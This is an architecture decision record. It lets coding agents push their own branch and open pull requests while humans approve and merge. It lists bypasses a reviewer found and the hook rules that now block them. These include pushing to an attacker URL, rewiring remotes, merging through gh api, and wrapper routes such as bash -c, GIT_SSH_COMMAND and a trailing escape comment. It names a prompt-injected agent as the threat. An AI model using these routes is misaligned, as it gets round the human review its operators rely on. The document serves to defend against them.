# 0207. Agents push their branch and open the PR; humans approve and merge

- Status: accepted
- Date: 2026-11-21
- Deciders: agent-written from Kacper's decision; effective when the human merges the PR. Adam's and Damian's confirmation are their own approvals of PR #27. The review thread (Adam, 2026-11-21) shaped the controls below, but it is not recorded here as a sign-off, and this ADR is not final until both approve, because it changes what every agent may do without asking

## Context

The root [`CLAUDE.md`](../../CLAUDE.md) said "No push, PR or merge without a fresh explicit go-ahead from the human", `.claude/SDLC.md` stage 7 made push and PR a human step, and `.claude/settings.json` put `git push` and `gh pr create` in `permissions.ask`, so every push prompted. Every change already passes the same gates before a PR exists: failing test first and a mutation check per task group, `iw-reviewer` per group and once over the branch, `docs-check`, the archive as the last commit, and the PR-ready criteria in [`.claude/CODE_REVIEW.md`](../../.claude/CODE_REVIEW.md). The git hook (`.claude/hooks/git-guard.js`, tested) already denies force push, any push to `main`, `--all`/`--mirror` and amending a pushed commit.

## Options considered

1. **Keep the human push and PR step.** Safest, but each PR waits for a person at the terminal, and the push itself adds no check the gates and the review do not already give.
2. **Agent pushes its branch and opens the PR; human approves and merges.** The human decision that matters (is this good enough for `main`) stays with the human at review and merge; a push of a feature branch is reversible and published nothing to `main`.
3. **Agent also merges.** Removes the last human gate; rejected, since the ADR rule "takes effect when the human approves and merges" and the review bar depend on it.

Option 2 as first written allowed `Bash(git push:*)`. Adam's review of PR #27 ran the real hook in a scratch repo and found three holes, all reproduced here against `git-guard.js` before any change (16 commands, all allowed):

- **A push to any other remote leaves the machine with no prompt**: `git push https://example.invalid/attacker/repo.git HEAD` and the scp-style form were allowed, as were `git remote add`, `git remote set-url` and `git config remote.origin.url`. This repository feeds scraped web text into LLM prompts, so a prompt-injected agent is a realistic threat, and the push happens before any human review, so "the human merge is the real control" does not cover it.
- **"Its own branch" was not enforced**: `git push origin HEAD:analytics/analytics-worker`, `git push origin --delete web/trend-chart`, `--prune` and glob refspecs were allowed.
- **"Never merges, never approves" was text only**: `gh api -X PUT .../pulls/N/merge` and `gh pr review N --approve` matched no rule.

## Decision

Option 2, with the holes closed. An agent pushes its own feature branch to `origin` and opens the PR in this repository once the PR-ready criteria hold. The human approves and merges every PR. The agent never merges, approves or marks a PR ready for someone else.

How each rule is held, and by what:

| Rule | Held by |
|---|---|
| Only `origin`, only the current branch | `permissions.allow` is narrowed to `Bash(git push origin:*)` and `Bash(git push -u origin:*)`; any other push matches no allow rule and falls to the default prompt. There is deliberately no `ask` rule for `git push`: rules are evaluated deny, then ask, then allow, so an `ask: Bash(git push:*)` would cancel the allow rules above (the first version of this PR had exactly that, found in Adam's second review; `settings-rules.test.js` now fails if an ask or deny rule covers an allow rule). The hook also holds push options to an allow-list (so `--del`, `--rece=x`, `--mir`, `--tags` and `-uf` are denied, not only the full spelling), denies another remote or URL, `--repo`/`--receive-pack`/`--exec`, `:ref`, glob and unreadable refspecs, a destination other than the current branch, a push from a detached HEAD, with `-C`/`--git-dir`, or chained after `checkout`/`switch` |
| The remote cannot be rewired first | the hook denies `git remote add\|set-url\|rename\|remove`, `git config remote.*`, `url.*`, `branch.*.remote`, `core.sshCommand`, `git -c` / `--config-env` with the same keys, and any quoted or expanded subcommand or `-c` value. Reading them stays allowed |
| Nothing straight to `main`, no `--force`, no amending a pushed commit | the hook (force now also in a cluster such as `-uf`) |
| No merge, no approve, no ready | `gh pr merge`, `gh pr ready` and `gh pr review` are in `permissions.ask`; the hook denies `gh api` calls that write (any method but GET, a body without `-X GET`, GraphQL), merge or approve, `gh pr review` with an approve flag in any spelling, and `gh pr create` for another repository (`--repo`, `-R`, `--head owner:branch`, `GH_REPO=`) |

Every one of these checks takes **no escape**: `IW_ALLOW_GIT=1` does nothing for them, not even as a trailing comment. A second review found that the first fix left the push checks escapable, and with the prompt gone an agent that writes `# IW_ALLOW_GIT=1` after `git push --force origin main` would have pushed with nobody asked. A human who needs a force push or a branch deletion runs it in their own terminal. The escape still exists for `reset --hard`, `clean -f` and the like, which have no allow rule and so still prompt.

The hook stays a guard against mistakes. It reads the command text only, so `bash -c '...'`, `python -c`, a script file, `export GH_REPO=...` in an earlier call, `GIT_SSH_COMMAND` in the environment, or editing `.git/config` with a file tool still get past it. Other `gh` commands that can do harm (`gh alias`, `gh repo delete`, `gh workflow run`, `gh secret set`) are not in the hook and fall to Claude Code's default prompt. The controls for pushing are the narrowed allow rule plus these checks, not "enforced by code". The residual risk is accepted because the push reaches only a branch that a human reviews before merge, and it is why `gh pr review` and every non-`origin` push still prompt.

How Claude Code evaluates these rules, from the permissions docs (https://code.claude.com/docs/en/permissions, read 2026-11-21; Adam's second review of this PR pointed to the same passages):

- **Order:** "Rules are evaluated in order: deny, then ask, then allow. The first match in that order determines the outcome, and rule specificity doesn't change the order", and "a matching ask rule prompts even when a more specific allow rule also matches the same call". The first version of this PR had `ask: Bash(git push:*)` next to `allow: Bash(git push origin:*)`, so every push still prompted and the PR changed nothing in practice. That `ask` rule is removed; `settings-rules.test.js` fails if an ask or deny rule ever covers an allow rule.
- **A hook cannot lift an `ask`:** "PreToolUse hook decisions don't bypass permission rules". A hook that blocks (exit code 2) stops the call before the rules are evaluated, which is how `git-guard.js` works.
- **Compound commands:** for an allow rule "every subcommand must be allowed", so `git push origin x; git push evil` is not auto-allowed (the second part matches no allow rule and prompts); deny and ask rules apply when any subcommand matches, including inside a subshell or substitution.
- **Prefixes and wrappers:** a leading assignment of an environment variable outside a built-in safe list stops an allow rule matching, so `FOO=1 git push origin x` prompts; `git -C . push origin x` does not match `Bash(git push origin:*)` and prompts too.
- **No rule matches:** the command prompts in the default mode and is auto-denied in `dontAsk` mode (CI and the headless watcher).

Not stated in the docs, and not tested here: how a trailing `# comment` is treated, whether an allow rule inspects the inside of `$(...)` or `( ... )`, and which environment variables are on the safe list. For those the hook's own checks (it splits on `( ) \`` and ignores comments) are the control. Whoever approves this PR should also run `git push origin <branch>` and `git push <other>` in a session and confirm with `/permissions` which rule matched; that run was not done by the agent that wrote this ADR.

Rationale: the existing gates run before the push, merge remains the human gate, and the evidence above shows what the first draft left open and that the fix is testable. Two independent attacks (Adam's review and an `iw-reviewer` security pass) each found real bypasses; all are now tests, 79 across the process scripts (45 in the hook), with a mutation check on the guards (52 tried, 52 caught).

## Consequences

- A PR can appear without anyone typing a go-ahead, so the PR body must list every behaviour change and every `IW_*` escape used (already a review criterion in `.claude/CODE_REVIEW.md`).
- A pushed commit is public: an agent that pushes too early cannot amend it, only add fix commits. The criteria in `.claude/CODE_REVIEW.md` apply before the first push.
- The hook is a guard against mistakes, not a security boundary (its own header says so); the narrowed allow rule, `permissions.ask` and the human review and merge are the real control. A quoted or expanded refspec (`git push origin "$BRANCH"`) is denied because the guard cannot read it: write the branch name plainly.
- `main` has no branch protection and rulesets are unavailable on this plan (`gh api .../branches/main/protection` returns 404 on 2026-11-21), so "a human approves" is a team convention that the checks above support, not something GitHub enforces. A repository admin can turn on required approvals; this ADR does not depend on it.
- The PR body must say that the PR loosens a permission (`.claude/settings.json`), so reviewers look at the controls and not only at the rule text.
- Supersedes the "fresh go-ahead" wording in `CLAUDE.md`, `.claude/SDLC.md`, `.claude/CODE_REVIEW.md`, `iw-pr-review` and `openspec/config.yaml`.
